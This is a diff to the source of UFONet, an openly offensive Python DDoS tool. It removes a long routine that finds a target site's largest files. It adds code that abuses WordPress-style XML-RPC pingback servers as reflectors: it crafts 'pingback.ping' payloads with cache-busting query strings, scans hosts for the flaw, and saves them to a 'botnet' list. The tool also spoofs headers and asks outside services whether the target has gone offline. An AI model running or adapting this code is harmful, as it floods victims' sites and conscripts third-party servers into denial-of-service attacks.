-                        mp4_file = urllib.urlopen(mp4)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        mp4_file = urllib2.urlopen(target_url + mp4, context=ctx)
-                    size = mp4_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(mp4_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                mp4s[mp4] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print mp4s
-            biggest_mp4 = max(mp4s.keys(), key=lambda x: mp4s[x]) # search/extract biggest video (.mp4) value from dict
-            biggest_files[biggest_mp4] = mp4s[biggest_mp4] # add biggest video (.mp4) to list
-        except: # if not any .mp4 found, go for next
-            pass
-        try: # search for .ogg files
-            regex_ogg = []
-            regex_ogg1 = "<src='(.+?.ogg)'" # search on target's results using regex with simple quotation
-            regex_ogg.append(regex_ogg1)
-            regex_ogg2 = '<src="(.+?.ogg)"' # search on target's results using regex with double quotation
-            regex_ogg.append(regex_ogg2)
-            #regex_ogg3 = '<src=(.+?.ogg)' # search on target's results using regex without quotations
-            #regex_ogg.append(regex_ogg3)
-            for regogg in regex_ogg:
-                pattern_ogg = re.compile(regogg)
-                ogg_links = re.findall(pattern_ogg, target_reply)
-            oggs = {}
-            for ogg in ogg_links:
-                print('+Video (.ogg) found: ' + ogg)
-                try:
-                    if ogg.startswith('http'):
-                        ogg_file = urllib.urlopen(ogg)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        ogg_file = urllib2.urlopen(target_url + ogg, context=ctx)
-                    size = ogg_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(ogg_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                oggs[ogg] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print oggs
-            biggest_ogg = max(oggs.keys(), key=lambda x: oggs[x]) # search/extract biggest video (.ogg) value from dict
-            biggest_files[biggest_ogg] = oggs[biggest_ogg] # add biggest video (.ogg) to list
-        except: # if not any .ogg found, go for next
-            pass
-        try: # search for .ogv files
-            regex_ogv = []
-            regex_ogv1 = "<src='(.+?.ogv)'" # search on target's results using regex with simple quotation
-            regex_ogv.append(regex_ogv1)
-            regex_ogv2 = '<src="(.+?.ogv)"' # search on target's results using regex with double quotation
-            regex_ogv.append(regex_ogv2)
-            #regex_ogv3 = '<src=(.+?.ogv)' # search on target's results using regex without quotations
-            #regex_ogv.append(regex_ogv3)
-            for regogv in regex_ogv:
-                pattern_ogv = re.compile(regogv)
-                ogv_links = re.findall(pattern_ogv, target_reply)
-            ogvs = {}
-            for ogv in ogv_links:
-                print('+Video (.ogv) found: ' + ogv)
-                try:
-                    if ogv.startswith('http'):
-                        ogv_file = urllib.urlopen(ogv)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        ogv_file = urllib2.urlopen(target_url + ogv, context=ctx)
-                    size = ogv_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(ogv_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                ogvs[ogv] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print ogvs
-            biggest_ogv = max(ogvs.keys(), key=lambda x: ogvs[x]) # search/extract biggest video (.ogv) value from dict
-            biggest_files[biggest_ogv] = ogvs[biggest_ogv] # add biggest video (.ogv) to list
-        except: # if not any .ogv found, go for next
-            pass
-        try: # search for .wmv files
-            regex_wmv = []
-            regex_wmv1 = "<src='(.+?.wmv)'" # search on target's results using regex with simple quotation
-            regex_wmv.append(regex_wmv1)
-            regex_wmv2 = '<src="(.+?.wmv)"' # search on target's results using regex with double quotation
-            regex_wmv.append(regex_wmv2)
-            #regex_wmv3 = '<src=(.+?.wmv)' # search on target's results using regex without quotations
-            #regex_wmv.append(regex_wmv3)
-            for regwmv in regex_wmv:
-                pattern_wmv = re.compile(regwmv)
-                wmv_links = re.findall(pattern_wmv, target_reply)
-            wmvs = {}
-            for wmv in wmv_links:
-                print('+Video (.wmv) found: ' + wmv)
-                try:
-                    if wmv.startswith('http'):
-                        wmv_file = urllib.urlopen(wmv)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        wmv_file = urllib2.urlopen(target_url + wmv, context=ctx)
-                    size = wmv_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(wmv_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Video)')
-                    size = 0
-                wmvs[wmv] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print wmvs
-            biggest_wmv = max(wmvs.keys(), key=lambda x: wmvs[x]) # search/extract biggest video (.wmv) value from dict
-            biggest_files[biggest_wmv] = wmvs[biggest_wmv] # add biggest video (.wmv) to list
-        except: # if not any .wmv found, go for next
-            pass
-        try: # search for .css files
-            regex_css = []
-            regex_css1 = "href='(.+?.css[^']*)'" # search on target's results using regex with simple quotation
-            regex_css.append(regex_css1)
-            regex_css2 = 'href="(.+?.css[^"]*)"' # search on target's results using regex with double quotation
-            regex_css.append(regex_css2)
-            #regex_css3 = "href=(.+?.css[^']*)" # search on target's results using regex without quotations
-            #regex_css.append(regex_css3)
-            for regcss in regex_css:
-                pattern_css = re.compile(regcss)
-                css_links = re.findall(pattern_css, target_reply)
-            csss = {}
-            for css in css_links:
-                print('+Style (.css) found: ' + css)
-                try:
-                    if css.startswith('http'):
-                        css_file = urllib.urlopen(css)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        css_file = urllib2.urlopen(target_url + css, context=ctx)
-                    size = css_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(css_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Style)')
-                    size = 0
-                csss[css] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print csss
-            biggest_css = max(csss.keys(), key=lambda x: csss[x]) # search/extract biggest style (.css) value from dict
-            biggest_files[biggest_css] = csss[biggest_css] # add biggest style (.css) to list
-        except: # if not any .css found, go for next
-            pass
-        try: # search for .js files
-            regex_js = []
-            regex_js1 = "src='(.+?.js[^']*)'" # search on target's results using regex with simple quotation
-            regex_js.append(regex_js1)
-            regex_js2 = 'src="(.+?.js[^"]*)"' # search on target's results using regex with double quotation
-            regex_js.append(regex_js2)
-            #regex_js3 = "src=(.+?.js[^']*)" # search on target's results using regex without quotations
-            #regex_js.append(regex_js3)
-            for regjs in regex_js:
-                pattern_js = re.compile(regjs)
-                js_links = re.findall(pattern_js, target_reply)
-            jss = {}
-            for js in js_links:
-                print('+Script (.js) found: ' + js)
-                try:
-                    if js.startswith('http'):
-                        js_file = urllib.urlopen(js)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        js_file = urllib2.urlopen(target_url + js, context=ctx)
-                    size = js_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(js_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Script)')
-                    size = 0
-                jss[js] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print jss
-            biggest_js = max(jss.keys(), key=lambda x: jss[x]) # search/extract biggest script (.js) value from dict
-            biggest_files[biggest_js] = jss[biggest_js] # add biggest script (.js) to list
-        except: # if not any .js found, go for next
-            pass
-        try: # search for .xml files
-            regex_xml = []
-            regex_xml1 = "href='(.+?.xml)'" # search on target's results using regex with simple quotation
-            regex_xml.append(regex_xml1)
-            regex_xml2 = 'href="(.+?.xml)"' # search on target's results using regex with double quotation
-            regex_xml.append(regex_xml2)
-            #regex_xml3 = 'href=(.+?.xml)' # search on target's results using regex without quotations
-            #regex_xml.append(regex_xml3)
-            for regxml in regex_xml:
-                pattern_xml = re.compile(regxml)
-                xml_links = re.findall(pattern_xml, target_reply)
-            xmls = {}
-            for xml in xml_links:
-                print('+Script (.xml) found: ' + xml)
-                try:
-                    if xml.startswith('http'):
-                        xml_file = urllib.urlopen(xml)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        xml_file = urllib2.urlopen(target_url + xml, context=ctx)
-                    size = xml_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(xml_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Script)')
-                    size = 0
-                xmls[xml] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print xmls
-            biggest_xml = max(xmls.keys(), key=lambda x: xmls[x]) # search/extract biggest script (.xml) value from dict
-            biggest_files[biggest_xml] = xmls[biggest_xml]  # add biggest script (.xml) to list
-        except: # if not any .xml found, go for next
-            pass
-        try: # search for .php files
-            regex_php = []
-            regex_php1 = "href='(.+?.php)'" # search on target's results using regex with simple quotation
-            regex_php.append(regex_php1)
-            regex_php2 = 'href="(.+?.php)"' # search on target's results using regex with double quotation
-            regex_php.append(regex_php2)
-            #regex_php3 = 'href=(.+?.php)' # search on target's results using regex without quotations
-            #regex_php.append(regex_php3)
-            for regphp in regex_php:
-                pattern_php = re.compile(regphp)
-                php_links = re.findall(pattern_php, target_reply)
-            phps = {}
-            for php in php_links:
-                print('+Webpage (.php) found: ' + php)
-                try:
-                    if php.startswith('http'):
-                        php_file = urllib.urlopen(php)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        php_file = urllib2.urlopen(target_url + php, context=ctx)
-                    size = php_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(php_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Webpage)')
-                    size = 0
-                phps[php] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print phps
-            biggest_php = max(phps.keys(), key=lambda x: phps[x]) # search/extract biggest file (.php) value from dict
-            biggest_files[biggest_php] = phps[biggest_php] # add biggest file (.php) to list
-        except: # if not any .php found, go for next
-            pass
-        try: # search for .html files
-            regex_html = []
-            regex_html1 = "href='(.+?.html)'" # search on target's results using regex with simple quotation
-            regex_html.append(regex_html1)
-            regex_html2 = 'href="(.+?.html)"' # search on target's results using regex with double quotation
-            regex_html.append(regex_html2)
-            #regex_html3 = 'href=(.+?.html)' # search on target's results using regex without quotations
-            #regex_html.append(regex_html3)
-            for reghtml in regex_html:
-                pattern_html = re.compile(reghtml)
-                html_links = re.findall(pattern_html, target_reply)
-            htmls = {}
-            for html in html_links:
-                print('+Webpage (.html) found: ' + html)
-                try:
-                    if html.startswith('http'):
-                        html_file = urllib.urlopen(html)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        html_file = urllib2.urlopen(target_url + html, context=ctx)
-                    size = html_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(html_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Webpage)')
-                    size = 0
-                htmls[html] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print htmls
-            biggest_html = max(htmls.keys(), key=lambda x: htmls[x]) # search/extract biggest file (.html) value from dict
-            biggest_files[biggest_html] = htmls[biggest_html] # add biggest file (.html) to list
-        except: # if not any .html found, go for next
-            pass
-        try: # search for .jsp files
-            regex_jsp = []
-            regex_jsp1 = "href='(.+?.jsp)'" # search on target's results using regex with simple quotation
-            regex_jsp.append(regex_jsp1)
-            regex_jsp2 = 'href="(.+?.jsp)"' # search on target's results using regex with double quotation
-            regex_jsp.append(regex_jsp2)
-            #regex_jsp3 = 'href=(.+?.jsp)' # search on target's results using regex without quotations
-            #regex_jsp.append(regex_jsp3)
-            for regjsp in regex_jsp:
-                pattern_jsp = re.compile(regjsp)
-                jsp_links = re.findall(pattern_jsp, target_reply)
-            jsps = {}
-            for jsp in jsp_links:
-                print('+Webpage (.jsp) found: ' + jsp)
-                try:
-                    if jsp.startswith('http'):
-                        jsp_file = urllib.urlopen(jsp)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        jsp_file = urllib2.urlopen(target_url + jsp, context=ctx)
-                    size = jsp_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(jsp_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Webpage)')
-                    size = 0
-                jsps[jsp] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print jsps
-            biggest_jsp = max(jsps.keys(), key=lambda x: jsps[x]) # search/extract biggest file (.jsp) value from dict
-            biggest_files[biggest_jsp] = jsps[biggest_jsp] # add biggest file (.jsp) to list
-        except: # if not any .jsp found, go for next
-            pass
-        try: # search for .asp files
-            regex_asp = []
-            regex_asp1 = "href='(.+?.asp)'" # search on target's results using regex with simple quotation
-            regex_asp.append(regex_asp1)
-            regex_asp2 = 'href="(.+?.asp)"' # search on target's results using regex with double quotation
-            regex_asp.append(regex_asp2)
-            #regex_asp3 = 'href=(.+?.asp)' # search on target's results using regex without quotations
-            #regex_asp.append(regex_asp3)
-            for regasp in regex_asp:
-                pattern_asp = re.compile(regasp)
-                asp_links = re.findall(pattern_asp, target_reply)
-            asps = {}
-            for asp in asp_links:
-                print('+Webpage (.asp) found: ' + asp)
-                try:
-                    if asp.startswith('http'):
-                        asp_file = urllib.urlopen(asp)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        asp_file = urllib2.urlopen(target_url + asp, context=ctx)
-                    size = asp_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(asp_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Webpage)')
-                    size = 0
-                asps[asp] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            #print asps
-            biggest_asp = max(asps.keys(), key=lambda x: asps[x]) # search/extract biggest file (.asp) value from dict
-            biggest_files[biggest_asp] = asps[biggest_asp] # add biggest file (.asp) to list
-        except: # if not any .asp found, go for next
-            pass
-        try: # search for .txt files
-            regex_txt = []
-            regex_txt1 = "href='(.+?.txt)'" # search on target's results using regex with simple quotation
-            regex_txt.append(regex_txt1)
-            regex_txt2 = 'href="(.+?.txt)"' # search on target's results using regex with double quotation
-            regex_txt.append(regex_txt2)
-            #regex_txt3 = 'href=(.+?.txt)' # search on target's results using regex without quotations
-            #regex_txt.append(regex_txt3)
-            for regtxt in regex_txt:
-                pattern_txt = re.compile(regtxt)
-                txt_links = re.findall(pattern_txt, target_reply)
-            txts = {}
-            for txt in txt_links:
-                print('+File (.txt) found: ' + txt)
-                try:
-                    if txt.startswith('http'):
-                        txt_file = urllib.urlopen(txt)
-                    else:
-                        target_host = urlparse(options.inspect)
-                        target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-                        if not target_url.endswith('/'): # add "/" to end of target
-                            target_url = target_url + "/"
-                        txt_file = urllib2.urlopen(target_url + txt, context=ctx)
-                    size = txt_file.headers.get("content-length")
-                    if size is None: # grab data with len if content-lenght is not available on headers
-                        size = len(txt_file.read())
-                except: 
-                    print('[Error] - Unable to retrieve info from Webpage)')
-                    size = 0
-                txts[txt] = int(size)
-                print('(Size: ' + str(size) + ' Bytes)')
-                print '-'*12
-            biggest_txt = max(txts.keys(), key=lambda x: txts[x]) # search/extract biggest file (.txt) value from dict
-            biggest_files[biggest_txt] = txts[biggest_txt] # add biggest file (.txt) to list
-        except: # if not any .txt found, go for next
-            pass
-        print '='*80
-        if(biggest_files=={}):
-            print "\nNo link found on target\n\n"
-            print '='*80 + '\n'
-            return #sys.exit(2)
-        biggest_file_on_target = max(biggest_files.keys(), key=lambda x: biggest_files[x]) # search/extract biggest file value from dict
-        if biggest_file_on_target.startswith('http'):
-            print ('=Biggest File: ' + biggest_file_on_target)
-        else:
-            target_host = urlparse(options.inspect)
-            target_url = target_host.scheme + "://" + target_host.netloc + target_host.path
-            if not target_url.endswith('/'): # add "/" to end of target
-                target_url = target_url + "/"
-            print ('=Biggest File: ' + target_url + biggest_file_on_target)
-        print '='*80 + '\n'
 
     def extract_dorks(self):
         # extract dorks from file (ex: 'dorks.txt')
@@ -2061,27 +1455,32 @@ class UFONet(object):
         shuffle(ucavs) # suffle ucavs
         for ucav in ucavs:
             self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             if target.startswith("http://"): # parse target for some checkers
                 target = target.replace('http://','')
             elif target.startswith("https://"):
                 target = target.replace('https://','')
             url = ucav + target
-            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if options.verbose:
+                print("[Info] Sniping: " + url)
             try:
-                if options.verbose:
-                    print("[Info] Sniping: " + url)
-                req = urllib2.Request(url, None, headers)
-                req_reply = urllib2.urlopen(req).read()
-                if not "is down" or not "looks down" in req_reply: # parse external service for reply
-                    print "[Info] UCAV: " + ucav + " -> HIT! || Report: ONLINE! [Keep shooting!]"
-                    num_is_up = num_is_up + 1 
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
+                    req = urllib2.Request(url, None, headers)
+                    target_reply = urllib2.urlopen(req).read()
                 else:
-                    print "[Info] UCAV: " + ucav + " -> FAILED? || Report: Target looks OFFLINE from here!!! ;-)"
-                    num_is_down = num_is_down + 1
+                    req = urllib2.Request(url, None, headers)
+                    target_reply = urllib2.urlopen(req, context=self.ctx).read()
                 self.ucavs_hit = self.ucavs_hit + 1 # add ucav hit to stats
-            except Exception:
+            except:
                 print "[Error] UCAV: " + ucav + " -> FAILED (cannot connect!)"
                 self.ucavs_fail = self.ucavs_fail + 1 # add ucav fail to stats
+            if not "is down" or not "looks down" in target_reply: # parse external service for reply
+                print "[Info] UCAV: " + ucav + " -> HIT! || Report: ONLINE! [Keep shooting!]"
+                num_is_up = num_is_up + 1 
+            else:
+                print "[Info] UCAV: " + ucav + " -> FAILED? || Report: Target looks OFFLINE from here!!! ;-)"
+                num_is_down = num_is_down + 1
         if num_is_down > 0 and num_is_up == 0: # check for: 1 or more down, 0 up
             print "\n[Info] Congratulations!. Your target looks OFFLINE from external sources...\n"
             if not self.options.forceyes:
@@ -2138,7 +1537,7 @@ class UFONet(object):
                         print "[Info] Sniping: " + url + " - POST:", param_target
                     req = urllib2.Request(url, param_target)
                     rsp = urllib2.urlopen(req)
-                    content = rsp.read()
+                    #content = rsp.read()
                     self.aliens_hit = self.aliens_hit + 1 # add hit to aliens stats
                 except Exception:
                     print "[Error] Alien: " + alien + " -> FAILED (cannot connect!)"
@@ -2184,8 +1583,9 @@ class UFONet(object):
                 self.user_agent = random.choice(self.agents).strip() # suffle user-agent 
                 headers = {'User-Agent' : self.user_agent, 'Content-type' : "application/x-www-form-urlencoded", 'Referer' : self.referer, 'Connection' : 'keep-alive'} # set fake headers
                 try:
-                    r = requests.get(url, headers=headers)
-                    self.droids_hit = self.droids_hit + 1 # add hit to droid stats
+                    req = urllib2.Request(url, None, headers)
+                    rsp = urllib2.urlopen(req)
+                    self.droids_hit = self.droids_hit + 1 # add hit to droids stats
                 except Exception:
                     print "[Error] Droid: " + url + " -> FAILED (cannot connect!)"
                     self.droids_fail = self.droids_fail + 1 # add fail to droids stats
@@ -2209,6 +1609,61 @@ class UFONet(object):
                 return #sys.exit(2)
             else:
                 print '\n[Error] - Cannot found:', 'droids.txt', "\n"
+                return #sys.exit(2)
+
+    def send_rpcs(self, target):
+        # extract vulnerable XML-RPC pingback services and perform requests against target
+        print "\n[Info] Aiming 'plasma' cannon reflector turrets...\n"
+        rpcs = self.extract_rpcs() # extract rpcs from file
+        self.total_rpcs = len(rpcs) # add total of rpcs to stats
+        shuffle(rpcs) # suffle rpcs
+        def random_key(length):
+            key = ''
+            for i in range(length):
+                key += random.choice(string.lowercase + string.uppercase + string.digits)
+            return key
+        for rpc in rpcs:
+            print "[Info] Firing from: " + rpc
+            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            key = random_key(8) # generate random value page to bypass cache
+            rpc_page = "?" + str(key)
+            key = random_key(6) # re-generate random value id to bypass cache
+            rpc_id = "=" + str(key)
+            target_place = target + rpc_page + rpc_id # random place to bypass cache (ex: www.target.com?U7OvBdp1=4lMcNj)
+            if "/xmlrpc.php" in rpc:
+                rpc_place = rpc.replace("xmlrpc.php", "")
+            rpc_exploit = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>"+target_place+"</string></value></param><param><value><string>"+rpc_place+"</string></value></param></params></methodCall>"
+            try:
+                req = urllib2.Request(rpc, rpc_exploit, headers)
+                target_reply = urllib2.urlopen(req, context=self.ctx).read()
+                self.rpcs_hit = self.rpcs_hit + 1 # add rpc hit to stats
+                if self.options.verbose:
+                    print "Reply:", target_reply
+            except:
+                print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
+                self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
+
+    def extract_rpcs(self):
+        # extract rpcs from file
+        options = self.options
+        try:
+            f = open(self.rpcs_file)
+            rpcs = f.readlines()
+            rpcs = [ rpc.replace('\r','') for rpc in rpcs ]
+            rpcs = [ rpc.replace('\n','') for rpc in rpcs ]
+            f.close()
+            if not rpcs:
+                print "\n[Error] - Imposible to retrieve 'rpcs' from file.\n"
+                return
+            else:
+                return rpcs
+        except:
+            if os.path.exists(self.rpcs_file) == True:
+                print '\n[Error] - Cannot open:', 'rpcs.txt', "\n"
+                return #sys.exit(2)
+            else:
+                print '\n[Error] - Cannot found:', 'rpcs.txt', "\n"
                 return #sys.exit(2)
 
     def extract_zombies(self):
@@ -2250,6 +1705,23 @@ class UFONet(object):
                 else:
                     print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
                     return #sys.exit(2)
+
+    def update_rpcs(self, rpcs_ready):
+        # update rpcs on file
+        options = self.options
+        if options.testrpc:
+            f = open(self.rpcs_file, "w") # re-write list
+            for rpc in rpcs_ready: # add only rpc verified zombies
+                f.write(rpc + os.linesep)
+            f.close()
+        if options.download: # append only new rpcs to list
+            f = open(self.rpcs_file)
+            rpcs_on_file = f.read().splitlines()
+            with open(self.rpcs_file, "a") as rpc_list:
+                for rpc in rpcs_ready:
+                    if rpc not in rpcs_on_file: # parse possible repetitions
+                        rpc_list.write(rpc + os.linesep)
+            f.close()
 
     def update_zombies(self, zombies_ready):
         # update zombies on file
@@ -2312,6 +1784,101 @@ class UFONet(object):
                         ucav_list.write(ucav + os.linesep)
             f.close()
 
+    def search_rpc(self, rpc_host):
+        rpc_vulnerable = False
+        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+        # send HTTP HEAD request searching for: X-Pingback
+        try:
+            if rpc_host.startswith("http://"):
+                rpc_host = rpc_host.replace("http://", "")
+            if rpc_host.startswith("https://"):
+                rpc_host = rpc_host.replace("https://", "")
+            rpc_host = urlparse(rpc_host)
+            rpc_path = rpc_host.path.replace("\r", "")
+            self.head = True
+            reply = self.connect_zombie(rpc_path)
+            self.head = False
+            if "X-Pingback" in reply: # discovering pingback-enabled resources
+                m = re.search('X-Pingback: (.+?)\n', reply) # regex magics
+                rpc_pingback_url = m.group(1) # extract rpc server url
+                rpc_vulnerable = True
+            else: # not X-Pingback on HTTP Headers (search for <link rel="pingback"... on HTML/XHTML code)
+                req_rpc = urllib2.Request(rpc_host, None, headers)
+                req_rpc.get_method = lambda : 'GET'
+                rpc_code = urllib2.urlopen(req_rpc).read()
+                rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
+                for link in rpc_links:
+                    if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
+                        rpc_pingback_url = link[0]
+                        rpc_vulnerable = True
+                    else: # not any XML-RPC discovering methods are working
+                        rpc_pingback_url = rpc_host + "/xmlrpc.php"
+                        rpc_vulnerable = False
+        except: # something wrong discovering XML-RCP Pingback
+            rpc_pingback_url = rpc_host + "/xmlrpc.php"
+            rpc_vulnerable = False
+        return rpc_vulnerable, rpc_pingback_url
+
+    def testing_rpcs(self, rpcs):
+        # discover/test XML-RPC Pingback vulnerabilities on webapps (Wordpress, Drupal, PostNuke, b2evolution, 
+        # Xoops, PHPGroupWare, TikiWiki, etc...) and update list
+        print ("Are 'plasma' reflectors ready? :-) (XML-RPC Check):")
+        print '='*35
+        num_active_rpcs = 0
+        num_failed_rpcs = 0
+        rpcs_ready = []
+        print "Trying:", len(rpcs)
+        print '-'*21
+        for rpc in rpcs:
+            self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
+            if rpc.startswith("http://") or rpc.startswith("https://"):
+                print "Searching 'Pingback' on", rpc
+                rpc_host = rpc.replace("/xmlrpc.php", "")
+                rpc_vulnerable, rpc_pingback_url = self.search_rpc(rpc_host)
+                if rpc_vulnerable == True: # discover XML-RPC system.listMethods allowed
+                    rpc_methods = "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
+                    try:
+                        req = urllib2.Request(rpc_pingback_url, rpc_methods, headers)
+                        target_reply = urllib2.urlopen(req, context=self.ctx).read()
+                        if self.options.verbose:
+                            print "Reply:", target_reply
+                        if "pingback.ping" in target_reply: # XML-RPC pingback.ping method is allowed!
+                            print "\n[Info] It looks VULNERABLE !!! ;-)"
+                            rpcs_ready.append(rpc_pingback_url) # save XML-RPC path as RPC zombie
+                            num_active_rpcs = num_active_rpcs + 1 # add fail to rpcs stats
+                        else:
+                            print "\n[Info] Is NOT vulnerable..."
+                            num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
+                    except:
+                        print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
+                        num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
+                else:
+                    print "\n[Info] Is NOT vulnerable..."
+                    num_failed_rpcs = num_failed_rpcs + 1 # add fail to rpcs stats
+            print '-'*10
+        print '='*18
+        print "OK:", num_active_rpcs, "Fail:", num_failed_rpcs
+        print '='*18
+        # update 'rpcs' list
+        if num_active_rpcs == 0:
+            print "\n[Info] - Not any vulnerable 'rpc' active!\n"
+            return #sys.exit(2)
+        else:
+            if not self.options.forceyes:
+                update_reply = raw_input("Wanna update your army (Y/n)")
+                print '-'*25
+            else:
+                update_reply = "Y"
+            if update_reply == "n" or update_reply == "N":
+                print "\nBye!\n"
+                return #sys.exit(2)
+            else:
+                self.update_rpcs(rpcs_ready)
+                if not self.options.upload:
+                    print "\n[Info] - Botnet updated! ;-)\n"
+
     def testing(self, zombies):
         # test Open Redirect vulnerabilities on webapps and show statistics
         # HTTP HEAD check
@@ -2328,7 +1895,7 @@ class UFONet(object):
             if zombie.startswith("http://") or zombie.startswith("https://"):
                 # send HEAD connection
                 self.head = True
-                self.connect_zombies(zombie)
+                reply = self.connect_zombies(zombie)
         while self.herd.no_more_zombies() == False:
             time.sleep(1)
         for zombie in self.herd.done:
@@ -2378,7 +1945,6 @@ class UFONet(object):
             zombie = str(zombie)
             t = urlparse(zombie)
             name_zombie = t.netloc
-            #print "Vector:", zombie
             self.payload = True
             try:
                 self.connect_zombies(zombie)
@@ -2521,13 +2087,14 @@ class UFONet(object):
             head_check_here = True
             head_check_external = True
         else:
-            self.head = True
             if head_check:
                 if not options.attackme:
                     print "Round: 'Is target up?'"
                     print '='*21
                     try: # send HEAD connection
+                        self.head = True
                         reply = self.connect_zombie(target)
+                        self.head = False
                         if reply:
                             print "[Info] From here: YES"
                             head_check_here = True
@@ -2559,8 +2126,6 @@ class UFONet(object):
                 print '-'*21
             else:
                 head_check_here = True
-            self.head = False
-
             # check target on third party service
             self.external = True
             if not options.attackme:
@@ -2585,7 +2150,6 @@ class UFONet(object):
                         print "[Error] From exterior: NO | Cannot reach external services from your network..."
                         head_check_external = False
             else:
-                self.head = True
                 try: # check mothership from public ip / NAT using HEAD request
                     try:
                         conn = httplib.HTTPConnection(str(self.pub_ip), 8080, timeout=10)
